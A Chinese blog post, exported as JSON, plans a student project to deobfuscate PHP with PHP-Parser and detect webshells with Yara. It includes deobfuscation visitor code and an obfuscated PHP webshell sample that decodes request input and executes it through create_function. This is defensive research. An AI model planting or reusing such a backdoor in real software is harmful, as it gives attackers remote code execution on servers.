{"title":"毕设项目:基于PHP-Parser进行反混淆与检测的规划","uid":"c9d8483a5df3999759441b46e5dfef6a","slug":"毕业设计の想法","date":"2022-02-10T12:00:00.000Z","updated":"2022-07-14T08:10:50.927Z","comments":true,"path":"api/articles/毕业设计の想法.json","keywords":null,"cover":null,"content":"<p>对于自己的毕设的一些功能的想法和未来该怎么做的一些规划</p>\n<span id=\"more\"></span>\n\n<h1 id=\"毕设项目-基于PHP-Parser的反混淆\"><a href=\"#毕设项目-基于PHP-Parser的反混淆\" class=\"headerlink\" title=\"毕设项目-基于PHP-Parser的反混淆\"></a>毕设项目-基于PHP-Parser的反混淆</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>大致设想是使用PHP-Parser完成反混淆，然后结合Yara进行检测。</p>\n<p>目前是没考虑过机器学习，后续可能会使用吧(<del>maybe</del></p>\n<h2 id=\"反混淆\"><a href=\"#反混淆\" class=\"headerlink\" title=\"反混淆\"></a>反混淆</h2><p>PHP-Parser基础来源于FeatureExtract中积累的操作</p>\n<p>根据Github上的反混淆项目和Deof项目进行改造，尽量理解两个项目的运行方式以及对待不同混淆时的操作</p>\n<h3 id=\"Deobf\"><a href=\"#Deobf\" class=\"headerlink\" title=\"Deobf\"></a>Deobf</h3><p>编写比较有逻辑，整体框架一目了然，对应文件的功能比较清晰</p>\n<p>但是现在功能不够全，对于一些情况目前无法处理，比如</p>\n<pre><code class=\"php\">&lt;?php \n$z0=$_REQUEST['sort'];\n$q1='';\n$c2=\"wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2\";\n$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);\nforeach($y3 as $h4) {\n    $q1.=$c2[$h4];\n}\n$v5=strrev(\"noi\".\"tcnuf\".\"_eta\".\"erc\");\n$j6=$v5(\"\",$q1($z0));\n$j6();\n?&gt;\n</code></pre>\n<p>在<code>$j6=$v5(\"\",$q1($z0));</code>这里不能直接反混淆出v5的值</p>\n<p>还有一些其他的功能没有实现，只实现了基础的反混淆，不过因为骨架已经搭好，未来应该在该项目基础上进行编写</p>\n<h3 id=\"一些常用的反混淆操作\"><a href=\"#一些常用的反混淆操作\" class=\"headerlink\" title=\"一些常用的反混淆操作\"></a>一些常用的反混淆操作</h3><h4 id=\"字符串函数直接返回值\"><a href=\"#字符串函数直接返回值\" class=\"headerlink\" title=\"字符串函数直接返回值\"></a>字符串函数直接返回值</h4><p>这里以base64_decode为例，后续可以把字符串操作函数放在数组里然后进行判断</p>\n<pre><code class=\"php\">function leavenode($node){\n    if($node instanceof PhpParser\\Node\\Expr\\FuncCall &amp;&amp; $node-&gt;name-&gt;parts[0] == \"base64_decode\"){\n        return new PhpParser\\Node\\Scalar\\String_($node-&gt;name-&gt;parts[0]($node-&gt;args[0]-&gt;value-&gt;value));\n    }\n}\n\n//例子如下\n&lt;?php\nbase64_decode(\"UEhQLVBhcnNlcg\");\n--After parser:--\n    \n&lt;?php\n'PHP-Parser';\n</code></pre>\n<h4 id=\"字符操作函数传递给变量然后动态调用\"><a href=\"#字符操作函数传递给变量然后动态调用\" class=\"headerlink\" title=\"字符操作函数传递给变量然后动态调用\"></a>字符操作函数传递给变量然后动态调用</h4><p>这个目前我没有啥好的想法，我的做法是设置两个Visitor，第一个Visitor遍历到函数声明的时候把函数名和函数值存在一个static数组里，第二个Visitor为进行操作的，当遍历到$node为函数调用时，去数组里进行查询，返回对应变量的值，然后返回成String_节点</p>\n<p>目前只写了针对单字符编码的测试，还有的函数需要多个参数，参数可能为字符也可能为变量，这里后续要考虑(初级想法是argv[]依次取出通过循环拼接命令，后续进行尝试)，还有要设计数据结构，变量可以给变量复制，是不是可以使用链表进行操作，终点指向字符串等。</p>\n<pre><code class=\"php\">Class StrVisitor extends NodeVisitorAbstract{\n    public function __construct()\n    {\n        $this-&gt;variable = new Variable;\n    }\n\n    function leavenode($node){\n        if($node instanceof PhpParser\\Node\\Expr\\Assign &amp;&amp; $node-&gt;var instanceof PhpParser\\Node\\Expr\\Variable &amp;&amp; $node-&gt;expr instanceof PhpParser\\Node\\Scalar\\String_) {\n            $this-&gt;variable-&gt;pushvariable($node-&gt;var-&gt;name,$node-&gt;expr-&gt;value);\n        }\n    }\n\n    function afterTraverse(array $nodes)\n    {\n        $this-&gt;variable-&gt;output();\n    }\n}\n\nClass FuncVisitor extends NodeVisitorAbstract{\n    public function __construct()\n    {\n        $this-&gt;variable = new Variable;\n    }\n\n    function leavenode($node){\n        if($node instanceof PhpParser\\Node\\Expr\\FuncCall &amp;&amp; $node-&gt;name instanceof PhpParser\\Node\\Expr\\Variable) {\n            $value = $node-&gt;args[0]-&gt;value-&gt;value;\n            $name = $this-&gt;variable-&gt;popvariable($node-&gt;name-&gt;name);\n            if($name){\n                return new Node\\Scalar\\String_($name($value));\n            }\n        }\n    }\n}\n\nClass Variable{\n    static $variablelist = [];\n    public function pushvariable($variablename,$variablevalue){\n        self::$variablelist[$variablename] = $variablevalue;\n    }\n\n    public function popvariable($variablename){\n        if(isset(self::$variablelist[$variablename])){\n            return self::$variablelist[$variablename];\n        }else{\n            return 0;\n        }\n    }\n\n    public function output(){\n        var_dump(self::$variablelist);\n    }\n}\n</code></pre>\n<p>测试如下</p>\n<pre><code class=\"php\">&lt;?php\n$a = 'base64_decode';\n$b = 'str_rot13';\n$c = 'chr';\n$d = 'strtolower';\n\n$d('@_POST');\n$c(97);\n$b('CUC-Cnefre');\n\n--After parser:--\n\n&lt;?php\n\n$a = 'base64_decode';\n$b = 'str_rot13';\n$c = 'chr';\n$d = 'strtolower';\n'@_post';\n'a';\n'PHP-Parser';\n</code></pre>\n<p>针对preg_replace这种多参数函数，php_deobf可以进行混淆出来，后续看一下怎么实现的<br><del>这里挖个坑，每天补一点</del></p>\n<h2 id=\"Yara\"><a href=\"#Yara\" class=\"headerlink\" title=\"Yara\"></a>Yara</h2><p>Yara规则依靠于积累的规则和开源项目例如</p>\n<p><a href=\"https://github.com/ruppde/yara_rules/blob/f375dbafa7b6aabd4e8fe8506a9e3ab9b8a57cbd/webshell/gen_webshells.yar\">yara_rules/gen_webshells.yar</a></p>\n<p>目前的想法是将工作的重点放在反混淆上，因为如果能将反混淆做的尽量彻底，那么规则就会很好写。</p>\n<h2 id=\"两者结合\"><a href=\"#两者结合\" class=\"headerlink\" title=\"两者结合\"></a>两者结合</h2><p>做一个后端或者直接在反混淆结束之后添加</p>\n<pre><code class=\"php\">system(\"yara -r webshell/rule webshell/sample\");\n</code></pre>\n<p>如果有时间还是想做一个好看的后端</p>\n<h2 id=\"短期要做的事\"><a href=\"#短期要做的事\" class=\"headerlink\" title=\"短期要做的事\"></a>短期要做的事</h2><ul>\n<li>看一下**<a href=\"https://github.com/L2ksy0d/PHPDeobfuscator\">PHPDeobfuscator</a>**是怎么解决变量值的存储和后续替换的(目前的想法是如果遍历到遍历声明或者变量赋值，就把变量名和值传给一个数组，当后续遇到变量被调用时从数组调值进行替换，明天试试)</li>\n<li>将Deobf当前的功能理清楚然后将目前已经可以做的补充进去</li>\n<li>调研一下后端的建设情况</li>\n</ul>\n","text":"对于自己的毕设的一些功能的想法和未来该怎么做的一些规划 毕设项目-基于PHP-Parser的反混淆前言大致设想是使用PHP-Parser完成反混淆，然后结合Yara进行检测。 目前是没考虑过机器学习，后续可能会使用吧(maybe 反混淆PHP-Parser基础来源于Feature...","link":"","photos":[],"count_time":{"symbolsCount":"3.6k","symbolsTime":"3 mins."},"categories":[],"tags":[{"name":"PHP-Parser","slug":"PHP-Parser","count":2,"path":"api/tags/PHP-Parser.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%AF%95%E8%AE%BE%E9%A1%B9%E7%9B%AE-%E5%9F%BA%E4%BA%8EPHP-Parser%E7%9A%84%E5%8F%8D%E6%B7%B7%E6%B7%86\"><span class=\"toc-text\">毕设项目-基于PHP-Parser的反混淆</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E6%B7%B7%E6%B7%86\"><span class=\"toc-text\">反混淆</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Deobf\"><span class=\"toc-text\">Deobf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%93%8D%E4%BD%9C\"><span class=\"toc-text\">一些常用的反混淆操作</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E5%80%BC\"><span class=\"toc-text\">字符串函数直接返回值</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0%E4%BC%A0%E9%80%92%E7%BB%99%E5%8F%98%E9%87%8F%E7%84%B6%E5%90%8E%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8\"><span class=\"toc-text\">字符操作函数传递给变量然后动态调用</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Yara\"><span class=\"toc-text\">Yara</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%A4%E8%80%85%E7%BB%93%E5%90%88\"><span class=\"toc-text\">两者结合</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%9F%AD%E6%9C%9F%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B\"><span class=\"toc-text\">短期要做的事</span></a></li></ol></li></ol>","author":{"name":"L2ksy0d","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"PHPer","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"W9scan源码分析","uid":"f927d1cc295b9e8d8e489045a2fb9555","slug":"W9scan源码分析","date":"2022-02-22T03:45:45.000Z","updated":"2022-07-14T08:10:50.927Z","comments":true,"path":"api/articles/W9scan源码分析.json","keywords":null,"cover":null,"text":"分析漏洞扫描器W9scan的源码，准备入坑安全开发？？ W9scan源码分析目前准备稍微入坑一下Python安全开发，准备从w9scan的源码入手开始学习，这个用来记录源码学习 ","link":"","photos":[],"count_time":{"symbolsCount":93,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"安全开发","slug":"安全开发","count":2,"path":"api/tags/安全开发.json"},{"name":"源码分析","slug":"源码分析","count":2,"path":"api/tags/源码分析.json"}],"author":{"name":"L2ksy0d","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"PHPer","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{}}